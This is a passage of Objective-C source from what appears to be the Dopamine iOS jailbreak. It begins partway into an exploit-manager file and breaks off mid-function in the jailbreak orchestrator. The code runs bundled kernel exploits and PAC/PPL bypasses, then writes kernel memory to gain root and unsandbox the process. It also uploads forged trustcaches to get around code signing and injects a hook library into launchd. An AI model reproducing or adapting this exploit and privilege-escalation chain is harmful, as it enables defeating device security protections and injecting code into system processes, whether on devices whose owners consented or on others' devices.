#import "DOPreferenceManager.h"

#define FORCE_PAC_BYPASS 0

@implementation DOExploitManager

+ (instancetype)sharedManager
{
    static DOExploitManager *shared;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        shared = [[DOExploitManager alloc] init];
    });
    return shared;
}

- (instancetype)init
{
    self = [super init];
    if (self) {
        _activeExploits = [NSMutableArray new];
        [self _loadAvailableExploits];
    }
    return self;
}

- (DOExploit *)_findPreferredExploitForType:(ExploitType)type
{
    DOExploit *preferredExploit = nil;
    for (DOExploit *exploit in [self availableExploitsForType:type]) {
        if (!preferredExploit || exploit.priority > preferredExploit.priority) {
            preferredExploit = exploit;
        }
    }
    return preferredExploit;
}

- (DOExploit *)_findExploitWithIdentifier:(NSString *)identifier andType:(ExploitType)type
{
    for (DOExploit *exploit in [self availableExploitsForType:type]) {
        if ([exploit.identifier isEqualToString:identifier]) return exploit;
    }
    return nil;
}

- (void)_loadAvailableExploits
{
    NSMutableSet *exploitSet = [NSMutableSet new];
    NSString *frameworksPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"Frameworks"];
    NSArray *contents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:frameworksPath error:nil];
    if (contents) {
        for (NSString *frameworkName in contents) {
            NSString *frameworkPath = [frameworksPath stringByAppendingPathComponent:frameworkName];
            NSDictionary *frameworkInfo = [NSDictionary dictionaryWithContentsOfFile:[frameworkPath stringByAppendingPathComponent:@"Info.plist"]];
            if (frameworkInfo) {
                if (frameworkInfo[@"DPExploitType"]) {
                    NSDictionary *flavors = frameworkInfo[@"DPExploitFlavors"];
                    [flavors enumerateKeysAndObjectsUsingBlock:^(NSString *flavorName, NSDictionary *flavorDict, BOOL *stop) {
                        [exploitSet addObject:[[DOExploit alloc] initWithPath:frameworkPath info:frameworkInfo flavorName:flavorName flavorDictionary:flavorDict]];
                    }];
                }
            }
        }
    }
    _allExploits = [exploitSet copy];
    
    for (ExploitType i = 0; i < EXPLOIT_TYPE_COUNT; i++) {
        _preferredExploitForType[i] = [self _findPreferredExploitForType:i];
    }
    
}

- (NSSet<DOExploit *> *)availableExploitsForType:(ExploitType)type
{
    NSMutableSet *subset = [NSMutableSet new];
    for (DOExploit *exploit in _allExploits) {
        if (exploit.type == type) {
            if ([exploit isSupported]) {
                [subset addObject:exploit];
            }
        }
    }
    return subset;
}

- (DOExploit *)preferredKernelExploit
{
    return _preferredExploitForType[EXPLOIT_TYPE_KERNEL];
}

- (DOExploit *)preferredPACBypass
{
    if (![DOEnvironmentManager sharedManager].isPACBypassRequired) return nil;
    return _preferredExploitForType[EXPLOIT_TYPE_PAC];
}

- (DOExploit *)preferredPPLBypass
{
    return _preferredExploitForType[EXPLOIT_TYPE_PPL];
}

- (DOExploit *)selectedKernelExploit
{
    NSString *identifier = [[DOPreferenceManager sharedManager] preferenceValueForKey:@"selectedKernelExploit"];
    if (!identifier) {
        return [self preferredKernelExploit];
    }
    return [self _findExploitWithIdentifier:identifier andType:EXPLOIT_TYPE_KERNEL];
}

- (DOExploit *)selectedPACBypass
{
    NSString *identifier = [[DOPreferenceManager sharedManager] preferenceValueForKey:@"selectedPACBypass"];
    if (!identifier) {
        return [self preferredPACBypass];
    }
    return [self _findExploitWithIdentifier:identifier andType:EXPLOIT_TYPE_PAC];
}

- (DOExploit *)selectedPPLBypass
{
    NSString *identifier = [[DOPreferenceManager sharedManager] preferenceValueForKey:@"selectedPPLBypass"];
    if (!identifier) {
        return [self preferredPPLBypass];
    }
    return [self _findExploitWithIdentifier:identifier andType:EXPLOIT_TYPE_PPL];
}

- (int)cleanUpExploits
{
    for (DOExploit *exploit in [_activeExploits reverseObjectEnumerator]) {
        int r = [exploit cleanup];
        if (r != 0) return r;
    }
    return 0;
}

@end

```

`Application/Dopamine/Jailbreak/DOJailbreaker.h`:

```h
//
//  Jailbreaker.h
//  Dopamine
//
//  Created by Lars Fröder on 10.01.24.
//

#import <Foundation/Foundation.h>

#import <xpc/xpc.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOJailbreaker : NSObject
{
    xpc_object_t _systemInfoXdict;
}

- (void)runWithError:(NSError **)errOut didRemoveJailbreak:(BOOL*)didRemove showLogs:(BOOL *)showLogs;
- (void)finalize;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/Jailbreak/DOJailbreaker.m`:

```m
//
//  Jailbreaker.m
//  Dopamine
//
//  Created by Lars Fröder on 10.01.24.
//

#import "DOJailbreaker.h"
#import "DOEnvironmentManager.h"
#import "DOExploitManager.h"
#import "DOUIManager.h"
#import <sys/stat.h>
#import <compression.h>
#import <xpf/xpf.h>
#import <dlfcn.h>
#import <libjailbreak/codesign.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/primitives_IOSurface.h>
#import <libjailbreak/physrw_pte.h>
#import <libjailbreak/physrw.h>
#import <libjailbreak/translation.h>
#import <libjailbreak/kernel.h>
#import <libjailbreak/info.h>
#import <libjailbreak/util.h>
#import <libjailbreak/trustcache.h>
#import <libjailbreak/kalloc_pt.h>
#import <libjailbreak/jbserver_boomerang.h>
#import <libjailbreak/signatures.h>
#import <libjailbreak/jbclient_xpc.h>
#import <libjailbreak/jbclient_mach.h>
#import <libjailbreak/kcall_arm64.h>
#import <libjailbreak/basebin_gen.h>
#import <CoreServices/LSApplicationProxy.h>
#import <sys/utsname.h>
#import "spawn.h"
int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);

#define kCFPreferencesNoContainer CFSTR("kCFPreferencesNoContainer")
void _CFPreferencesSetValueWithContainer(CFStringRef key, CFPropertyListRef value, CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
Boolean _CFPreferencesSynchronizeWithContainer(CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
CFArrayRef _CFPreferencesCopyKeyListWithContainer(CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);
CFDictionaryRef _CFPreferencesCopyMultipleWithContainer(CFArrayRef keysToFetch, CFStringRef applicationID, CFStringRef userName, CFStringRef hostName, CFStringRef containerPath);

//char *_dirhelper(int a, char *dst, size_t size);

NSString *const JBErrorDomain = @"JBErrorDomain";
typedef NS_ENUM(NSInteger, JBErrorCode) {
    JBErrorCodeFailedToFindKernel            = -1,
    JBErrorCodeFailedKernelPatchfinding      = -2,
    JBErrorCodeFailedLoadingExploit          = -3,
    JBErrorCodeFailedExploitation            = -4,
    JBErrorCodeFailedBuildingPhysRW          = -5,
    JBErrorCodeFailedCleanup                 = -6,
    JBErrorCodeFailedGetRoot                 = -7,
    JBErrorCodeFailedUnsandbox               = -8,
    JBErrorCodeFailedPlatformize             = -9,
    JBErrorCodeFailedBasebinTrustcache       = -10,
    JBErrorCodeFailedLaunchdInjection        = -11,
    JBErrorCodeFailedInitProtection          = -12,
    JBErrorCodeFailedInitFakeLib             = -13,
    JBErrorCodeFailedDuplicateApps           = -14,
};

@implementation DOJailbreaker

- (NSError *)gatherSystemInformation
{
    NSString *kernelPath = [[DOEnvironmentManager sharedManager] accessibleKernelPath];
    if (!kernelPath) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedToFindKernel userInfo:@{NSLocalizedDescriptionKey:@"Failed to find kernelcache. Ensure your device is properly connected to the internet. If it still does not work, try installing Dopamine via TrollStore instead."}];
    NSLog(@"Kernel at %s", kernelPath.UTF8String);
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Patchfinding") debug:NO];
    
    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation);
    if (r == 0) {
        char *sets[] = {
            "translation",
            "trustcache",
            "sandbox",
            "physmap",
            "struct",
            "physrw",
            "perfkrw",
            NULL,
            NULL,
            NULL,
            NULL,
        };

        uint32_t idx = 7;
        if (xpf_set_is_supported("devmode")) {
            sets[idx++] = "devmode"; 
        }
        if (xpf_set_is_supported("badRecovery")) {
            sets[idx++] = "badRecovery"; 
        }
        if (xpf_set_is_supported("arm64kcall")) {
            sets[idx++] = "arm64kcall"; 
        }

        _systemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
        if (_systemInfoXdict) {
            xpc_dictionary_set_uint64(_systemInfoXdict, "kernelConstant.staticBase", gXPF.kernelBase);
            printf("System Info:\n");
            xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
                if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
                return true;
            });
        }
        if (!_systemInfoXdict) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF failed with error: (%s)", xpf_get_error()]}];
        }
        xpf_stop();
    }
    else {
        NSError *error = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF start failed with error: (%s)", xpf_get_error()]}];
        xpf_stop();
        return error;
    }
    
    jbinfo_initialize_dynamic_offsets(_systemInfoXdict);
    jbinfo_initialize_hardcoded_offsets();
    _systemInfoXdict = jbinfo_get_serialized();
    
    if (_systemInfoXdict) {
        printf("System Info libjailbreak:\n");
        xpc_dictionary_apply(_systemInfoXdict, ^bool(const char *key, xpc_object_t value) {
            if (xpc_get_type(value) == XPC_TYPE_UINT64) {
                if (xpc_uint64_get_value(value)) {
                    printf("0x%016llx <- %s\n", xpc_uint64_get_value(value), key);
                }
            }
            return true;
        });
    }
    
    return nil;
}

- (NSError *)doExploitation
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    DOExploit *pacBypass = [DOExploitManager sharedManager].selectedPACBypass;
    DOExploit *pplBypass = [DOExploitManager sharedManager].selectedPPLBypass;
    if (!kernelExploit) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Kernel exploit is required but we did not find any"}];
    }
    if (!pacBypass && [DOEnvironmentManager sharedManager].isPACBypassRequired) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PAC bypass is required but we did not find any"}];
    }
    if (!pplBypass && [DOEnvironmentManager sharedManager].isPPLBypassRequired) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PPL bypass is required but we did not find any"}];
    }
    
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Exploiting Kernel (%@)"), kernelExploit.name] debug:NO];
    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load kernel exploit: %s", dlerror()]}];
    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to exploit kernel"}];
    
    jbinfo_initialize_boot_constants();
    libjailbreak_translation_init();
    libjailbreak_IOSurface_primitives_init();
    
    if (pacBypass) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PAC (%@)"), pacBypass.name] debug:NO];
        if ([pacBypass load] != 0) {[kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PAC bypass: %s", dlerror()]}];};
        if ([pacBypass run] != 0) {[kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PAC"}];}
        // At this point we presume the PAC bypass has given us stable kcall primitives
        gSystemInfo.jailbreakInfo.usesPACBypass = true;
    }

    if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@"Bypassing PPL (%@)"), pplBypass.name] debug:NO];
        if ([pplBypass load] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PPL bypass: %s", dlerror()]}];};
        if ([pplBypass run] != 0) {[pacBypass cleanup]; [kernelExploit cleanup]; return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PPL"}];}
        // At this point we presume the PPL bypass gave us unrestricted phys write primitives
    }
    if (!gPrimitives.kalloc_global) {
        // IOSurface kallocs don't work on iOS 16+, use leaked page tables as allocations instead
        libjailbreak_kalloc_pt_init();
    }
    
    if (![DOEnvironmentManager sharedManager].isArm64e) {
        arm64_kcall_init();
    }

    return nil;
}

- (NSError *)buildPhysRWPrimitive
{
    int r = -1;
    if (device_supports_physrw_pte()) {
        r = libjailbreak_physrw_pte_init(false, 0);
    }
    else {
        r = libjailbreak_physrw_init(false);
    }
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBuildingPhysRW userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to build phys r/w primitive: %d", r]}];
    }
    return nil;
}

- (NSError *)cleanUpExploits
{
    int r = [[DOExploitManager sharedManager] cleanUpExploits];
    if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedCleanup userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to cleanup exploits: %d", r]}];
    return nil;
}

- (NSError *)elevatePrivileges
{
    uint64_t proc = proc_self();
    uint64_t ucred = proc_ucred(proc);
    
    // Get uid 0
    kwrite32(proc + koffsetof(proc, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, ruid), 0);
    kwrite32(ucred + koffsetof(ucred, uid), 0);
    
    // Get gid 0
    kwrite32(proc + koffsetof(proc, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, rgid), 0);
    kwrite32(ucred + koffsetof(ucred, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, groups), 0);
    
    // Add P_SUGID
    uint32_t flag = kread32(proc + koffsetof(proc, flag));
    if ((flag & P_SUGID) != 0) {
        flag &= P_SUGID;
        kwrite32(proc + koffsetof(proc, flag), flag);
    }
    
    if (getuid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, uid still %d", getuid()]}];
    if (getgid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, gid still %d", getgid()]}];
    
    // Unsandbox
    uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
    mac_label_set(label, 1, -1);
    NSError *error = nil;
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&error];
    if (error) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedUnsandbox userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to unsandbox, /var does not seem accessible (%s)", error.description.UTF8String]}];
    setenv("HOME", "/var/root", true);
    setenv("CFFIXED_USER_HOME", "/var/root", true);
    setenv("TMPDIR", "/var/tmp", true);
    
    // FUCKING dirhelper caches the temporary path
    // So we have to do userland patchfinding to find the fucking string and overwrite it
    /*char **pain = NULL;
    uint32_t *dirhelperData = (uint32_t *)_dirhelper;
    for (int i = 0; i < 100; i++) {
        arm64_register destinationReg;
        uint64_t imm = 0;
        if (arm64_dec_ldr_imm(dirhelperData[i], &destinationReg, NULL, &imm, NULL, NULL) == 0) {
            if (ARM64_REG_GET_NUM(destinationReg) == 1) {
                uint32_t *adrpAddr = &dirhelperData[i - 1];
                uint64_t adrpTarget = 0;
                uint32_t adrpInst = *adrpAddr;
                if (arm64_dec_adr_p(adrpInst, (uint64_t)adrpAddr, &adrpTarget, NULL, NULL) == 0) {
                    pain = (char **)(uint64_t)(adrpTarget + imm);
                    break;
                }
            }
        }
    }
    *pain = strdup("/var/tmp");*/
    
    // Get CS_PLATFORM_BINARY
    proc_csflags_set(proc, CS_PLATFORM_BINARY);
    uint32_t csflags;
    csops(getpid(), CS_OPS_STATUS, &csflags, sizeof(csflags));
    if (!(csflags & CS_PLATFORM_BINARY)) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedPlatformize userInfo:@{NSLocalizedDescriptionKey:@"Failed to get CS_PLATFORM_BINARY"}];
    
    return nil;
}

- (NSError *)showNonDefaultSystemApps
{
    _CFPreferencesSetValueWithContainer(CFSTR("SBShowNonDefaultSystemApps"), kCFBooleanTrue, CFSTR("com.apple.springboard"), CFSTR("mobile"), kCFPreferencesAnyHost, kCFPreferencesNoContainer);
    _CFPreferencesSynchronizeWithContainer(CFSTR("com.apple.springboard"), CFSTR("mobile"), kCFPreferencesAnyHost, kCFPreferencesNoContainer);
    return nil;
}

- (NSError *)ensureDevModeEnabled
{
    if (@available(iOS 16.0, *)) {
        uint64_t developer_mode_storage = kread64(ksymbol(developer_mode_enabled));
        kwrite8(developer_mode_storage, 1);
    }
    return nil;
}

- (NSError *)loadBasebinTrustcache
{
    trustcache_file_v1 *basebinTcFile = NULL;
    if (trustcache_file_build_from_path([[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"basebin.tc"].fileSystemRepresentation, &basebinTcFile) == 0) {
        int r = trustcache_file_upload_with_uuid(basebinTcFile, BASEBIN_TRUSTCACHE_UUID);
        free(basebinTcFile);
        if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebinTrustcache userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to upload BaseBin trustcache: %d", r]}];
        return nil;
    }
    return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBasebinTrustcache userInfo:@{NSLocalizedDescriptionKey : @"Failed to load BaseBin trustcache"}];
}

struct boomerang_info {
    mach_port_t serverPort;
    dispatch_semaphore_t boomerangDone;
};

void *boomerang_server(struct boomerang_info *info)
{
    while (true) {
        xpc_object_t xdict = nil;
        if (!xpc_pipe_receive(info->serverPort, &xdict)) {
            if (jbserver_received_boomerang_xpc_message(&gBoomerangServer, xdict) == JBS_BOOMERANG_DONE) {
                dispatch_semaphore_signal(info->boomerangDone);
                break;
            }
        }
    }
    return NULL;
}

- (NSError *)injectLaunchdHook
{
    // Host a boomerang server that will be used by launchdhook to get the jailbreak primitives from this app
    mach_port_t serverPort = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &serverPort);
    mach_port_insert_right(mach_task_self(), serverPort, serverPort, MACH_MSG_TYPE_MAKE_SEND);
    
    struct boomerang_info info;
    info.serverPort = serverPort;
    info.boomerangDone = dispatch_semaphore_create(0);
    
    pthread_t boomerangThread;
    pthread_create(&boomerangThread, NULL, (void *(*)(void *))boomerang_server, &info);
    pthread_detach(boomerangThread);

    // Stash port to server in launchd's initPorts[2]
    // Since we don't have the neccessary entitlements, we need to do it over jbctl
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_set_registered_ports_np(&attr, (mach_port_t[]){MACH_PORT_NULL, MACH_PORT_NULL, serverPort}, 3);
    pid_t spawnedPid = 0;
    const char *jbctlPath = JBROOT_PATH("/basebin/jbctl");
    int spawnError = posix_spawn(&spawnedPid, jbctlPath, NULL, &attr, (char *const *)(const char *[]){ jbctlPath, "internal", "launchd_stash_port", NULL }, NULL);
    if (spawnError != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Spawning jbctl failed with error code %d", spawnError]}];
    }
    posix_spawnattr_destroy(&attr);
    int status = 0;
    do {
        if (waitpid(spawnedPid, &status, 0) == -1) {
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : @"Waiting for jbctl failed"}];;
        }
    } while (!WIFEXITED(status) && !WIFSIGNALED(status));

    // Inject launchdhook.dylib into launchd via opainject
    int r = exec_cmd(JBROOT_PATH("/basebin/opainject"), "1", JBROOT_PATH("/basebin/launchdhook.dylib"), NULL);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLaunchdInjection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"opainject failed with error code %d", r]}];
    }

    // Wait for everything to finish
    dispatch_semaphore_wait(info.boomerangDone, DISPATCH_TIME_FOREVER);
    mach_port_deallocate(mach_task_self(), serverPort);

    return nil;
}

- (NSError *)applyProtection
{
    int r = [[DOEnvironmentManager sharedManager] setPrivatePrebootProtected:YES];
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitProtection userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed initializing protection with error: %d", r]}];
    }
    return nil;
}

- (NSError *)createFakeLib
{
    int r = basebin_generate(false);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Creating fakelib failed with error: %d", r]}];
    }

    cdhash_t *cdhashes = NULL;
    uint32_t cdhashesCount = 0;
    file_collect_untrusted_cdhashes_by_path(JBROOT_PATH("/basebin/.fakelib/dyld"), &cdhashes, &cdhashesCount);
    if (cdhashesCount != 1) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Got unexpected number of cdhashes for dyld???: %d", cdhashesCount]}];
    
    trustcache_file_v1 *dyldTCFile = NULL;
    r = trustcache_file_build_from_cdhashes(cdhashes, cdhashesCount, &dyldTCFile);
    free(cdhashes);
    if (r == 0) {
        int r = trustcache_file_upload_with_uuid(dyldTCFile, DYLD_TRUSTCACHE_UUID);
        if (r != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to upload dyld trustcache: %d", r]}];
        free(dyldTCFile);
    }
    else {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : @"Failed to build dyld trustcache"}];
    }
    
    r = [[DOEnvironmentManager sharedManager] setFakelibMounted:YES];
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedInitFakeLib userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Mounting fakelib failed with error: %d", r]}];
    }
    
    // Now that fakelib is up, we want to make systemhook inject into any binary we spawn
    setenv("DYLD_INSERT_LIBRARIES", "/usr/lib/systemhook.dylib", 1);
    return nil;
}

- (NSError *)ensureNoDuplicateApps
{
    NSMutableSet *dopamineInstalledAppIds = [NSMutableSet new];
    NSMutableSet *userInstalledAppIds = [NSMutableSet new];
    
    NSString *dopamineAppsPath = JBROOT_PATH(@"/Applications");
    NSString *userAppsPath = @"/var/containers/Bundle/Application";
    
    for (NSString *dopamineAppName in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dopamineAppsPath error:nil]) {
        NSString *infoPlistPath = [[dopamineAppsPath stringByAppendingPathComponent:dopamineAppName] stringByAppendingPathComponent:@"Info.plist"];
        NSDictionary *infoDictionary = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
        NSString *appId = infoDictionary[@"CFBundleIdentifier"];
        if (appId) {
            if (![dopamineInstalledAppIds containsObject:appId]) {
                [dopamineInstalledAppIds addObject:appId];
            }
            else {
                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_Dopamine_App"), appId, dopamineAppsPath]}];
            }
        }
    }
    
    for (NSString *appUUID in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:userAppsPath error:nil]) {
        NSString *UUIDPath = [userAppsPath stringByAppendingPathComponent:appUUID];
        for (NSString *appCandidate in [[NSFileManager defaultManager] contentsOfDirectoryAtPath:UUIDPath error:nil]) {
            if ([appCandidate.pathExtension isEqualToString:@"app"]) {
                NSString *appPath = [UUIDPath stringByAppendingPathComponent:appCandidate];
                NSString *infoPlistPath = [appPath stringByAppendingPathComponent:@"Info.plist"];
                NSDictionary *infoDictionary = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
                NSString *appId = infoDictionary[@"CFBundleIdentifier"];
                if (appId) {
                    [userInstalledAppIds addObject:appId];
                }
            }
        }
    }
    
    NSMutableSet *duplicateApps = dopamineInstalledAppIds.mutableCopy;
    [duplicateApps intersectSet:userInstalledAppIds];
    if (duplicateApps.count) {
        NSMutableString *duplicateAppsString = [NSMutableString new];
        [duplicateAppsString appendString:@"["];
        BOOL isFirst = YES;
        for (NSString *duplicateApp in duplicateApps) {
            if (isFirst) isFirst = NO;
            else [duplicateAppsString appendString:@", "];
            [duplicateAppsString appendString:duplicateApp];
        }
        [duplicateAppsString appendString:@"]"];
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_User_App"), duplicateAppsString, dopamineAppsPath]}];
    }
    
    for (NSString *dopamineAppId in dopamineInstalledAppIds) {
        LSApplicationProxy *appProxy = [LSApplicationProxy applicationProxyForIdentifier:dopamineAppId];
        if (appProxy.installed) {
            NSString *appProxyPath = [[appProxy.bundleURL.path stringByResolvingSymlinksInPath] stringByStandardizingPath];
            if (![appProxyPath hasPrefix:dopamineAppsPath]) {
                return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedDuplicateApps userInfo:@{ NSLocalizedDescriptionKey : [NSString stringWithFormat:DOLocalizedString(@"Duplicate_Apps_Error_Icon_Cache"), dopamineAppId, dopamineAppsPath, appProxy.bundleURL.path]}];
            }
        }
    }
    
    return nil;
}

- (NSError *)finalizeBootstrapIfNeeded
{
    return [[DOEnvironmentManager sharedManager] finalizeBootstrap];
}

- (void)runWithError:(NSError **)errOut didRemoveJailbreak:(BOOL*)didRemove showLogs:(BOOL *)showLogs
{
    BOOL removeJailbreakEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"removeJailbreakEnabled" fallback:NO];
    BOOL tweaksEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"tweakInjectionEnabled" fallback:YES];
    BOOL idownloadEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"idownloadEnabled" fallback:NO];
    BOOL appJITEnabled = [[DOPreferenceManager sharedManager] boolPreferenceValueForKey:@"appJITEnabled" fallback:YES];
    NSNumber *jetsamMultiplierOption = [[DOPreferenceManager sharedManager] preferenceValueForKey:@"jetsamMultiplier"];
    
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *startLog = [NSString stringWithFormat:@"Starting Jailbreak (Model: %s, %@, Configuration: {removeJailbreak=%d, tweakInjection=%d, idownload=%d, appJIT=%d})", systemInfo.machine, NSProcessInfo.processInfo.operatingSystemVersionString, removeJailbreakEnabled, tweaksEnabled, idownloadEnabled, appJITEnabled];
    [[DOUIManager sharedInstance] sendLog:startLog debug:YES];
    
    *errOut = [self gatherSystemInformation];
    if (*errOut) return;
    *errOut = [self doExploitation];
    if (*errOut) return;
    
    gSystemInfo.jailbreakSettings.markAppsAsDebugged = appJITEnabled;
    gSystemInfo.jailbreakSettings.jetsamMultiplier = jetsamMultiplierOption ? (jetsamMultiplierOption.doubleValue / 2) : 0;
    
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Building Phys R/W Primitive") debug:NO];
    *errOut = [self buildPhysRWPrimitive];
    if (*errOut) return;
    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Cleaning Up Exploits") debug:NO];
    *errOut = [self cleanUpExploits];
    if (*errOut) return;
    
    // We will not be able to reset this after elevating privileges, so do it now
    if (removeJailbreakEnabled) [[DOPreferenceManager sharedManager] setPreferenceValue:@NO forKey:@"removeJailbreakEnabled"];

    [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Elevating Privileges") debug:NO];
    *errOut = [self elevatePrivileges];
    if (*errOut) return;
    *errOut = [self showNonDefaultSystemApps];
    if (*errOut) return;
    *errOut = [self ensureDevModeEnabled];
    if (*errOut) return;

    // Now that we are unsandboxed, populate the jailbreak root path
    *errOut = [[DOEnvironmentManager sharedManager] ensureJailbreakRootExists];
    if (*errOut) return;
    
    if (removeJailbreakEnabled) {
        [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Removing Jailbreak") debug:NO];
        *errOut = [[DOEnvironmentManager sharedManager] deleteBootstrap];
        *didRemove = YES;
        return;
    }
    
    *errOut = [[DOEnvironmentManager sharedManager] prepareBootstrap];
    if (*errOut) return;
    setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/var/jb/sbin:/var/jb/bin:/var/jb/usr/sbin:/var/jb/usr/bin", 1);
    setenv("TERM", "xterm-256color", 1);

    *errOut = [[DOEnvironmentManager sharedManager] updateBootLogo];
    if (*errOut) return;
    
